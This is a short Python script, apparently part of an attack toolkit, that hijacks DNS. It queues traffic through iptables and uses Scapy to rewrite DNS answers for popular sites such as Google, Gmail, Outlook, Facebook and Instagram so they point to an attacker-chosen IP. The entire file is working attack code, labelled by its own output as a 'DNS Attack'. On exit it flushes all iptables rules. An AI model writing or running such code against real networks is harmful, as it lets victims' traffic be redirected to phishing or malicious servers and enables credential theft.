from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

#dictionary of domain names to be modified when requested by target
domainNames = {"www.google.com.", "google.com.", "www.yahoo.com.", "yahoo.com.", "www.bing.com.", "bing.com.", "www.gmail.com.", "gmail.com.", "www.outlook.com.", "outlook.com.", "facebook.com.", "www.facebook.com.", "www.twitter.com.", "twitter.com.", "www.instagram.com.", "instagram.com."}

# Used to process the Packet
def processPacket(packet):
    payloadPacket = IP(packet.get_payload()) #get scapy packet from the received netfilterqueue packet
    if payloadPacket.haslayer(DNSRR):
        try:
            payloadPacket = modifyPacket(payloadPacket) #modifying the response values
        except IndexError:
            pass
        packet.set_payload(bytes(payloadPacket))
    packet.accept()

def modifyPacket(packet):
    queryName = packet[DNSQR].qname #get queried domain name
    if queryName not in domainNames:
        return packet
    packet[DNS].an = DNSRR(rrname = queryName, rdata = globalServRed) #replace query answer with the desired IP from the domain dictionary
    
    #additional edits to the packet - checksums, lengths
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    #final packet with all edits returned
    return packet

def startDNS(servRed):
    global globalServRed
    globalServRed = servRed;
    QUEUE_NUM = 4

    #create iptable and use it
    os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    queue = NetfilterQueue()

    try:
        #binding queue number to processPacket
        queue.bind(QUEUE_NUM, processPacket)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print("DNS Attack stopped")



